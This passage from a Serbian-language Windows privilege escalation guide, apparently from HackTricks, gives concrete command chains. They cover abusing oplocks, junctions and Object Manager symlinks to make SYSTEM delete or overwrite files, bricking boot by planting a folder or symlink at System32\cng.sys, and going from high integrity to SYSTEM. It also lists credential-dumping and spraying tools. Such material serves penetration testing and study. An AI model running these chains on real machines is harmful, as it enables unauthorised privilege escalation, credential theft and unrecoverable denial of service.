Dakle, ako **obrišete `::$INDEX_ALLOCATION` stream** fascikle, NTFS **uklanja celu fasciklu** iz sistema datoteka.

To možete uraditi pomoću standardnih API-ja za brisanje datoteka, kao što su:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Iako pozivate API za brisanje *file*-a, on **briše sam folder**.

### Od brisanja sadržaja foldera do SYSTEM EoP
Šta ako vaš primitive ne dozvoljava brisanje proizvoljnih file-ova/foldera, ali **dozvoljava brisanje *sadržaja* foldera kojim napadač upravlja**?

1. Korak 1: Podesite folder i file-mamac
- Kreirajte: `C:\temp\folder1`
- Unutar njega: `C:\temp\folder1\file1.txt`

2. Korak 2: Postavite **oplock** na `file1.txt`
- Oplock **pauzira izvršavanje** kada privilegovani proces pokuša da obriše `file1.txt`.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Korak 3: Pokrenite SYSTEM proces (npr. `SilentCleanup`)
- Ovaj proces skenira fascikle (npr. `%TEMP%`) i pokušava da izbriše njihov sadržaj.
- Kada dođe do `file1.txt`, **oplock se aktivira** i predaje kontrolu vašem callback-u.

4. Korak 4: Unutar oplock callback-a – preusmerite brisanje

- Opcija A: Premestite `file1.txt` na drugo mesto
- Ovo prazni `folder1` bez prekidanja oplock-a.
- Nemojte direktno brisati `file1.txt` — to bi prerano oslobodilo oplock.

- Opcija B: Pretvorite `folder1` u **junction**:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Opcija C: Kreirajte **symlink** u `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Ovo cilja interni NTFS stream koji čuva metapodatke fascikle — njegovo brisanje briše fasciklu.

5. Korak 5: Oslobodite oplock
- SYSTEM proces nastavlja i pokušava da obriše `file1.txt`.
- Ali sada, zbog junction + symlink, on zapravo briše:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Rezultat**: `C:\Config.Msi` briše SYSTEM.

### Od kreiranja proizvoljnog foldera do trajnog DoS-a

Iskoristite primitive koji vam omogućava da **kreirate proizvoljan folder kao SYSTEM/admin** — čak i ako **ne možete da upisujete fajlove** ili **postavljate slabe dozvole**.

Kreirajte **folder** (ne fajl) sa imenom **kritičnog Windows drivera**, npr.:
```
C:\Windows\System32\cng.sys
```
- Ova putanja obično odgovara kernel-mode driveru `cng.sys`.
- Ako je **unapred kreirate kao folder**, Windows ne uspeva da učita stvarni driver prilikom boot-a.
- Zatim Windows pokušava da učita `cng.sys` tokom boot-a.
- Uočava folder, **ne uspeva da pronađe stvarni driver** i **ruši se ili zaustavlja boot**.
- Ne postoji **fallback** niti **oporavak** bez spoljne intervencije (npr. popravke boot-a ili pristupa disku).

### Od privilegovanih putanja za logove/backup + OM symlinks do proizvoljnog prepisivanja fajlova / boot DoS-a

Kada **privilegovani servis** upisuje logove/exports na putanju pročitanu iz **config-a koji može da se menja**, preusmerite tu putanju pomoću **Object Manager symlinks + NTFS mount points** da biste privilegovani upis pretvorili u proizvoljno prepisivanje (čak i **bez SeCreateSymbolicLinkPrivilege**).<sup>[[15]](#references)</sup>

**Zahtevi**
- Config u kojem se čuva ciljna putanja može da menja attacker (npr. `%ProgramData%\...\.ini`).
- Mogućnost kreiranja mount point-a ka `\RPC Control` i OM file symlink-a (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- Privilegovana operacija koja upisuje na tu putanju (log, export, report).

**Primer lanca**
1. Pročitajte config da biste dobili odredište privilegovanog log-a, npr. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` u fajlu `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Preusmerite putanju bez admin privilegija:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Sačekajte da privilegovana komponenta upiše log (npr. administrator pokrene „send test SMS“). Upis se sada izvršava u `C:\Windows\System32\cng.sys`.
4. Pregledajte prepisanu metu (hex/PE parserom) da biste potvrdili oštećenje; ponovno pokretanje primorava Windows da učita izmenjenu putanju drajvera → **boot loop DoS**. Ovo se takođe može primeniti na bilo koju zaštićenu datoteku koju će privilegovani servis otvoriti za upis.

> `cng.sys` se obično učitava iz `C:\Windows\System32\drivers\cng.sys`, ali ako kopija postoji u `C:\Windows\System32\cng.sys`, ona može biti prvo pokušano učitana, što je čini pouzdanim DoS odredištem za oštećene podatke.



## **Od High Integrity do SYSTEM**

### **New service**

Ako već izvršavate proces sa High Integrity nivoom, **path to SYSTEM** može biti jednostavan: samo **kreirajte i izvršite novi servis**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Prilikom kreiranja service binary-ja uverite se da je validan service ili da binary dovoljno brzo izvršava neophodne radnje, jer će biti prekinut za 20 s ako nije validan service.

### AlwaysInstallElevated

Iz procesa visokog integriteta možete pokušati da **omogućite AlwaysInstallElevated registry entries** i **instalirate** reverse shell pomoću _**.msi**_ wrapper-a.\
[Više informacija o registry ključevima koji su uključeni i o tome kako instalirati _.msi_ paket možete pronaći ovde.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Kod možete** [**pronaći ovde**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Ako imate te token privileges (verovatno ćete ih pronaći u već pokrenutom procesu visokog integriteta), moći ćete da **otvorite gotovo bilo koji proces** (osim protected processes) pomoću SeDebug privilege-a, **kopirate token** procesa i kreirate **proizvoljan proces sa tim tokenom**.\
Korišćenjem ove tehnike obično se **bira bilo koji proces koji se izvršava kao SYSTEM sa svim token privileges** (_da, možete pronaći SYSTEM procese bez svih token privileges_).\
**Primer koda koji izvršava predloženu tehniku možete** [**pronaći ovde**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Ovu tehniku koristi meterpreter za privilege escalation u `getsystem`. Tehnika se sastoji od **kreiranja pipe-a, a zatim kreiranja/zloupotrebe service-a za pisanje u taj pipe**. Zatim će **server** koji je kreirao pipe pomoću **`SeImpersonate`** privilege-a moći da **impersonate-uje token** pipe client-a (service-a) i dobije SYSTEM privileges.\
Ako želite da [**saznate više o name pipes, pročitajte ovo**](#named-pipe-client-impersonation).\
Ako želite da pročitate primer [**prelaska sa visokog integriteta na System pomoću name pipes, pročitajte ovo**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Ako uspete da **hijack-ujete dll** koji **učitava** **proces** koji se izvršava kao **SYSTEM**, moći ćete da izvršavate proizvoljan kod sa tim permissions. Zato je Dll Hijacking takođe koristan za ovu vrstu privilege escalation-a, a, štaviše, mnogo ga je **lakše izvesti iz procesa visokog integriteta**, jer će taj proces imati **write permissions** nad folderima koji se koriste za učitavanje dll-ova.\
**Više o Dll hijacking-u možete** [**saznati ovde**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Pročitajte:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Najbolji tool za pronalaženje Windows local privilege escalation vektora:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Proverava misconfigurations i sensitive files (**[**proverite ovde**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detected.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Proverava neke moguće misconfigurations i prikuplja informacije (**[**proverite ovde**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Proverava misconfigurations**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Izvlači sačuvane informacije o sesijama iz PuTTY-ja, WinSCP-ja, SuperPuTTY-ja, FileZilla-e i RDP-a. Koristite -Thorough lokalno.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Izvlači credentials iz Credential Manager-a. Detected.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Vrši spray prikupljenih passwords kroz domain**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh je PowerShell ADIDNS/LLMNR/mDNS spoofer i man-in-the-middle tool.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Osnovna Windows enumeracija za privesc**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Pretražuje poznate privesc vulnerabilities (DEPRECATED for Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Lokalne provere **(Need Admin rights)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Pretražuje poznate privesc vulnerabilities (mora biti kompajliran pomoću VisualStudio-a) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumeriše host u potrazi za misconfigurations (više je gather info tool nego privesc tool) (mora biti kompajliran) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Izvlači credentials iz velikog broja software-a (precompiled exe na github-u)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port PowerUp-a za C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Proverava misconfiguration (executable precompiled na github-u). Ne preporučuje se. Ne radi dobro u Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Proverava moguće misconfigurations (exe iz Python-a). Ne preporučuje se. Ne radi dobro u Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Tool kreiran na osnovu ovog posta (nije mu potreban accesschk za pravilan rad, ali može da ga koristi).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Čita izlaz komande **systeminfo** i preporučuje exploits koji rade (lokalni Python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Čita izlaz komande **systeminfo** i preporučuje exploits koji rade (lokalni Python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Morate da kompajlirate projekat koristeći odgovarajuću verziju .NET-a ([pogledajte ovo](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Da biste videli instaliranu verziju .NET-a na victim host-u, možete izvršiti:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Reference

- [1] [Osnove Windows Privilege Escalation](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Povećavanje privilegija iskorišćavanjem slabih dozvola fascikli](http://www.greyhathacker.net/?p=738)
- [3] [Windows Privilege Escalation - cheatsheet](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - radionica za Windows / Linux Local Privilege Escalation](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Windows napadi: AT je nova crna boja (Rob Fuller i Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Privilege Escalation - Windows - kompletan OSCP vodič](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - Privilege Escalation - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Vodič za Windows Privilege Escalation](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Windows-Privilege-Escalation kontrolna lista](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Windows Privilege Escalation metode za Pentesters](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing preko SMTP-a → dešifrovanje hMailServer kredencijala → Veeam CVE-2023-27532 do SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) i krađa kernel tokena](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Potera za Silver Foxom: igra mačke i miša u senkama kernela](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – Ranljivost privilegovanog datotečnog sistema prisutna u SCADA sistemu](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Alati za testiranje simboličkih linkova – upotreba CreateSymlink-a](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [Povratak u prošlost. Zloupotreba simboličkih linkova na Windowsu](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Node.js Trust Falls: opasna rezolucija modula na Windowsu](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Node.js moduli: učitavanje iz fascikli `node_modules`](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - rešeni izazovi C/C++ kontrolne liste](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - funkcija RtlQueryRegistryValues](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Pwn2Own with Microslop: ulančavanje CLDFLT i DirectX race uslova u kernelu za Windows LPE](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [Jedan I/O Ring da svima vlada: potpuna exploit primitiva za čitanje/pisanje na Windowsu 11](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Zloupotreba proizvoljnog brisanja datoteka za povećavanje privilegija i drugi sjajni trikovi](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - kod exploita FilesystemEoPs](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – WSUS napadi, 2. deo: CVE-2020-1013, Windows 10 Local Privilege Escalation 1-Day](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: istraživanje Credential Manager-a i Windows Vault-a](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - CVE-2019-1388 PoC](https://github.com/jas502n/CVE-2019-1388)

{{#include ../../banners/hacktricks-training.md}}
